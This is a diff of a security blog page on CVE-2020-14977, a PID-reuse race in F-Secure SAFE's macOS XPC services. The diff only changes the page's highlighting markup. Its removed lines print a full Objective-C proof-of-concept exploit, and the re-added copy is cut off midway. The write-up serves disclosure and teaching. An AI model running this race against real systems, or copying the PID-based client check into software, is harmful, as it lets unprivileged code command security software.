@@ -56,7 +56,7 @@ The root cause The XPC services of F-Secure SAFE use the process ID (PID) to ver
     <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-32x32.png" sizes="32x32">
     <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-16x16.png" sizes="16x16">
 
-    <meta name="generator" content="Hugo 0.92.1" />
+    <meta name="generator" content="Hugo 0.96.0" />
   </head>
 
   <body class=" ">
@@ -146,121 +146,121 @@ The root cause The XPC services of F-Secure SAFE use the process ID (PID) to ver
         <p>In the last post of the series we will see another typical issue, where XPC services using the connecting process&rsquo;s ID (PID) to verify the client instead of the audit token. We will use F-Secure SAFE again for our case study, the vulnerability was fixed in 17.8 and it was assigned CVE-2020-14977.</p>
 <h2 id="the-root-cause">The root cause</h2>
 <p>The XPC services of F-Secure SAFE use the process ID (PID) to verify the client&rsquo;s signature, as can be seen in the code below.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec">+(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#c0f">verifyPid:</span>(<span style="color:#078;font-weight:bold">int</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">codesignatureAgainstRequirements:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg3</span> {
-    var_44 <span style="color:#555">=</span> arg2;
-    r14 <span style="color:#555">=</span> [arg3 <span style="color:#069;font-weight:bold">retain</span>];
-    r15 <span style="color:#555">=</span> [SignatureVerificationResult new];
-    rax <span style="color:#555">=</span> CFNumberCreate(<span style="color:#555">**</span>_kCFAllocatorDefault, <span style="color:#f60">0x3</span>, <span style="color:#555">&amp;</span>var_44);
-    var_40 <span style="color:#555">=</span> rax;
-    <span style="color:#069;font-weight:bold">if</span> (rax <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
-            rax <span style="color:#555">=</span> CFDictionaryCreate(<span style="color:#555">**</span>_kCFAllocatorDefault, <span style="color:#555">*</span>_kSecGuestAttributePid, <span style="color:#555">&amp;</span>var_40, <span style="color:#f60">0x1</span>, <span style="color:#f60">0x0</span>, <span style="color:#f60">0x0</span>);
-</code></pre></div><p>The problem with this approach is that on macOS, PIDs can be reused. We can even replace current executable to a different process with <code>posix_spawn()</code> while keeping the old PID, and this is the technique we will use in our exploit later on. The flags <code>POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED</code> passed to <code>posix_spawn</code> will result in starting the process in a suspended mode, and keeping the same PID (the old process is replaced by the new one, keeping the PID). Our exploit will fork 10 processes, each of them sending a message to the XPC service, and each forked process will replace itself with a valid F-Secure client. This way when the XPC service verifies the code signature of the connecting client, it will see the spawned process (this is where we have a race condition), and once its verified it will consume the XPC message sent earlier. With a loop for about 10 times we can easily win the race condition, sometimes even 1 or 2 spawns are enough. The POC keeps track of the child processes, and kills them at the end.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span>+(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#c0f">verifyPid:</span>(<span style="color:#078;font-weight:bold">int</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">codesignatureAgainstRequirements:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg3</span> {
+</span></span><span style="display:flex;"><span>    var_44 <span style="color:#555">=</span> arg2;
+</span></span><span style="display:flex;"><span>    r14 <span style="color:#555">=</span> [arg3 <span style="color:#069;font-weight:bold">retain</span>];
+</span></span><span style="display:flex;"><span>    r15 <span style="color:#555">=</span> [SignatureVerificationResult new];
+</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> CFNumberCreate(<span style="color:#555">**</span>_kCFAllocatorDefault, <span style="color:#f60">0x3</span>, <span style="color:#555">&amp;</span>var_44);
+</span></span><span style="display:flex;"><span>    var_40 <span style="color:#555">=</span> rax;
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (rax <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
+</span></span><span style="display:flex;"><span>            rax <span style="color:#555">=</span> CFDictionaryCreate(<span style="color:#555">**</span>_kCFAllocatorDefault, <span style="color:#555">*</span>_kSecGuestAttributePid, <span style="color:#555">&amp;</span>var_40, <span style="color:#f60">0x1</span>, <span style="color:#f60">0x0</span>, <span style="color:#f60">0x0</span>);
+</span></span></code></pre></div><p>The problem with this approach is that on macOS, PIDs can be reused. We can even replace current executable to a different process with <code>posix_spawn()</code> while keeping the old PID, and this is the technique we will use in our exploit later on. The flags <code>POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED</code> passed to <code>posix_spawn</code> will result in starting the process in a suspended mode, and keeping the same PID (the old process is replaced by the new one, keeping the PID). Our exploit will fork 10 processes, each of them sending a message to the XPC service, and each forked process will replace itself with a valid F-Secure client. This way when the XPC service verifies the code signature of the connecting client, it will see the spawned process (this is where we have a race condition), and once its verified it will consume the XPC message sent earlier. With a loop for about 10 times we can easily win the race condition, sometimes even 1 or 2 spawns are enough. The POC keeps track of the child processes, and kills them at the end.</p>
 <p>Note: the forked processes will have 10 different PIDs, but when they spawn a new process with <code>exec</code> method, that is the point where the PID is retained.</p>
 <h2 id="poc">POC</h2>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec"><span style="color:#099">#import &lt;Foundation/Foundation.h&gt;
-</span><span style="color:#099">#include</span> <span style="color:#099">&lt;spawn.h&gt;</span><span style="color:#099">
-</span><span style="color:#099">#include</span> <span style="color:#099">&lt;signal.h&gt;</span><span style="color:#099">
-</span><span style="color:#099"></span>
-<span style="color:#069;font-weight:bold">static</span> NSString<span style="color:#555">*</span> XPCHelperMachServiceName <span style="color:#555">=</span> <span style="color:#c30">@&#34;com.f-secure.fscsafeadmind&#34;</span>;
-
-<span style="color:#069;font-weight:bold">@protocol</span> <span style="color:#0a8;font-weight:bold">fscsafeadmindProtocol</span>
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">getScreenSaverPasswordState:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg1</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">isKextLoaded:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg2</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">isServiceRunning:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg2</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">unsubscribeEndpoint:</span>(NSXPCListenerEndpoint <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">fromProtocol:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg2</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">subscribeToChangesWithProtocol:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">andEndpoint:</span>(NSXPCListenerEndpoint <span style="color:#555">*</span>)<span style="color:#033">arg2</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setUninstallationProtectionEnabled:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setScanningExclusions:</span>(NSArray <span style="color:#555">*</span>)<span style="color:#033">arg1</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">getXFenceDisabledInSettings:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg1</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">disableScheduledScanning</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">enableScheduledScanning:</span>(<span style="color:#078;font-weight:bold">id</span> <span style="color:#555">&lt;</span>NSSecureCoding<span style="color:#555">&gt;</span>)<span style="color:#033">arg1</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setXfenceEnabledNoAuth:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setFRSEnabledNoAuth:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">oasIsTemporarilyDisabled:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg1</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">getOASState:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">long</span> <span style="color:#078;font-weight:bold">long</span>))<span style="color:#033">arg1</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setOASEnabledNoAuth:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">getIsolationState:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg1</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setFirewallBlock:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setFirewallEnabledNoAuth:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">getFirewallState:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">long</span> <span style="color:#078;font-weight:bold">long</span>))<span style="color:#033">arg1</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">getSignupDataWithCallback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSError <span style="color:#555">*</span>, NSString <span style="color:#555">*</span>, NSString <span style="color:#555">*</span>))<span style="color:#033">arg1</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setTimeLimits:</span>(<span style="color:#078;font-weight:bold">id</span> <span style="color:#555">&lt;</span>NSSecureCoding<span style="color:#555">&gt;</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">user:</span>(<span style="color:#078;font-weight:bold">unsigned</span> <span style="color:#078;font-weight:bold">int</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg3</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">disableWebBlockingForUserWithID:</span>(<span style="color:#078;font-weight:bold">unsigned</span> <span style="color:#078;font-weight:bold">int</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg2</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setFirewallEnabled:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">authorization:</span>(NSData <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg3</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">getXfenceNonAdminCanCreateRulesWithCallback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg1</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setXfenceNonAdminCanCreateRules:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">authorization:</span>(NSData <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg3</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">getXFENCEFilterStatusWithCallback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg1</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setXfenceEnabled:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">authorization:</span>(NSData <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg3</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setSubscription:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">key:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">authorization:</span>(NSData <span style="color:#555">*</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">long</span> <span style="color:#078;font-weight:bold">long</span>))<span style="color:#033">arg4</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setFRSEnabled:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">authorization:</span>(NSData <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg3</span>;
-- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setOASEnabled:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">resumeTime:</span>(<span style="color:#078;font-weight:bold">double</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">authorization:</span>(NSData <span style="color:#555">*</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg4</span>;
-<span style="color:#069;font-weight:bold">@end</span>
-
-<span style="color:#078;font-weight:bold">int</span> main(<span style="color:#078;font-weight:bold">void</span>) {
-
-    <span style="color:#099">#define RACE_COUNT 10
-</span><span style="color:#099"></span>    <span style="color:#099">#define kValid &#34;/Applications/F-Secure/Support Tool.app/Contents/MacOS/Support Tool&#34;
-</span><span style="color:#099"></span>    <span style="color:#069;font-weight:bold">extern</span> <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>environ;
-
-    <span style="color:#078;font-weight:bold">int</span> pids[RACE_COUNT];
-    <span style="color:#069;font-weight:bold">for</span> (<span style="color:#078;font-weight:bold">int</span> i <span style="color:#555">=</span> <span style="color:#f60">0</span>; i <span style="color:#555">&lt;</span> RACE_COUNT; i<span style="color:#555">++</span>)
-    {
-        <span style="color:#078;font-weight:bold">int</span> pid <span style="color:#555">=</span> fork();
-        <span style="color:#069;font-weight:bold">if</span> (pid <span style="color:#555">==</span> <span style="color:#f60">0</span>)
-        {
-        NSString<span style="color:#555">*</span>  _serviceName <span style="color:#555">=</span> XPCHelperMachServiceName;
-        NSXPCConnection<span style="color:#555">*</span> _agentConnection <span style="color:#555">=</span> [[NSXPCConnection alloc] <span style="color:#99f">initWithMachServiceName</span>:_serviceName <span style="color:#99f">options</span>:<span style="color:#f60">4096</span>];
-        [_agentConnection <span style="color:#99f">setRemoteObjectInterface</span>:[NSXPCInterface <span style="color:#99f">interfaceWithProtocol</span>:@protocol(fscsafeadmindProtocol)]];
-        [_agentConnection resume];
-
-        <span style="color:#078;font-weight:bold">id</span> obj <span style="color:#555">=</span> [_agentConnection <span style="color:#99f">remoteObjectProxyWithErrorHandler</span>:<span style="color:#555">^</span>(NSError<span style="color:#555">*</span> error)
-         {
-             (<span style="color:#078;font-weight:bold">void</span>)error;
-             NSLog(<span style="color:#c30">@&#34;Connection Failure&#34;</span>);
-         }];
-        NSLog(<span style="color:#c30">@&#34;obj: %@&#34;</span>, obj);
-        NSLog(<span style="color:#c30">@&#34;conn: %@&#34;</span>, _agentConnection);
-        <span style="color:#09f;font-style:italic">//get FW state
-</span><span style="color:#09f;font-style:italic"></span>        [obj <span style="color:#99f">getFirewallState</span>:<span style="color:#555">^</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#078;font-weight:bold">long</span> b){
-             NSLog(<span style="color:#c30">@&#34;Response: %llx&#34;</span>,b);
-                 }];
- 
-        NSLog(<span style="color:#c30">@&#34;Done&#34;</span>);
-        <span style="color:#078;font-weight:bold">char</span> target_binary[] <span style="color:#555">=</span> kValid;
-        <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>target_argv[] <span style="color:#555">=</span> {target_binary, <span style="color:#366">NULL</span>};
-        posix_spawnattr_t attr;
-        posix_spawnattr_init(<span style="color:#555">&amp;</span>attr);
-        <span style="color:#078;font-weight:bold">short</span> flags;
-        posix_spawnattr_getflags(<span style="color:#555">&amp;</span>attr, <span style="color:#555">&amp;</span>flags);
-        flags <span style="color:#555">|=</span> (POSIX_SPAWN_SETEXEC <span style="color:#555">|</span> POSIX_SPAWN_START_SUSPENDED);
-        posix_spawnattr_setflags(<span style="color:#555">&amp;</span>attr, flags);
-        posix_spawn(<span style="color:#366">NULL</span>, target_binary, <span style="color:#366">NULL</span>, <span style="color:#555">&amp;</span>attr, target_argv, environ);
-        }
-        printf(<span style="color:#c30">&#34;forked %d</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>, pid);
-        pids[i] <span style="color:#555">=</span> pid;
-    }
-    <span style="color:#09f;font-style:italic">// keep the children alive
-</span><span style="color:#09f;font-style:italic"></span>    sleep(<span style="color:#f60">10</span>);
-    
-    <span style="color:#99f">cleanup</span>:
-    <span style="color:#069;font-weight:bold">for</span> (<span style="color:#078;font-weight:bold">int</span> i <span style="color:#555">=</span> <span style="color:#f60">0</span>; i <span style="color:#555">&lt;</span> RACE_COUNT; i<span style="color:#555">++</span>)
-    {
-        pids[i] <span style="color:#555">&amp;&amp;</span> kill(pids[i], <span style="color:#f60">9</span>);
-    }
-}
-</code></pre></div><p>We compile the code with:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#099">#import &lt;Foundation/Foundation.h&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;spawn.h&gt;</span><span style="color:#099">
+</span></span></span><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;signal.h&gt;</span><span style="color:#099">
+</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">static</span> NSString<span style="color:#555">*</span> XPCHelperMachServiceName <span style="color:#555">=</span> <span style="color:#c30">@&#34;com.f-secure.fscsafeadmind&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@protocol</span> <span style="color:#0a8;font-weight:bold">fscsafeadmindProtocol</span>
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">getScreenSaverPasswordState:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg1</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">isKextLoaded:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg2</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">isServiceRunning:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg2</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">unsubscribeEndpoint:</span>(NSXPCListenerEndpoint <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">fromProtocol:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg2</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">subscribeToChangesWithProtocol:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">andEndpoint:</span>(NSXPCListenerEndpoint <span style="color:#555">*</span>)<span style="color:#033">arg2</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setUninstallationProtectionEnabled:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setScanningExclusions:</span>(NSArray <span style="color:#555">*</span>)<span style="color:#033">arg1</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">getXFenceDisabledInSettings:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg1</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">disableScheduledScanning</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">enableScheduledScanning:</span>(<span style="color:#078;font-weight:bold">id</span> <span style="color:#555">&lt;</span>NSSecureCoding<span style="color:#555">&gt;</span>)<span style="color:#033">arg1</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setXfenceEnabledNoAuth:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setFRSEnabledNoAuth:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">oasIsTemporarilyDisabled:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg1</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">getOASState:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">long</span> <span style="color:#078;font-weight:bold">long</span>))<span style="color:#033">arg1</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setOASEnabledNoAuth:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">getIsolationState:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg1</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setFirewallBlock:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setFirewallEnabledNoAuth:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">getFirewallState:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">long</span> <span style="color:#078;font-weight:bold">long</span>))<span style="color:#033">arg1</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">getSignupDataWithCallback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSError <span style="color:#555">*</span>, NSString <span style="color:#555">*</span>, NSString <span style="color:#555">*</span>))<span style="color:#033">arg1</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setTimeLimits:</span>(<span style="color:#078;font-weight:bold">id</span> <span style="color:#555">&lt;</span>NSSecureCoding<span style="color:#555">&gt;</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">user:</span>(<span style="color:#078;font-weight:bold">unsigned</span> <span style="color:#078;font-weight:bold">int</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg3</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">disableWebBlockingForUserWithID:</span>(<span style="color:#078;font-weight:bold">unsigned</span> <span style="color:#078;font-weight:bold">int</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg2</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setFirewallEnabled:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">authorization:</span>(NSData <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg3</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">getXfenceNonAdminCanCreateRulesWithCallback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg1</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setXfenceNonAdminCanCreateRules:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">authorization:</span>(NSData <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg3</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">getXFENCEFilterStatusWithCallback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg1</span>;
+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setXfenceEnabled:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">authorization:</span>(NSData <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">callback:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(<span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg3</span>;
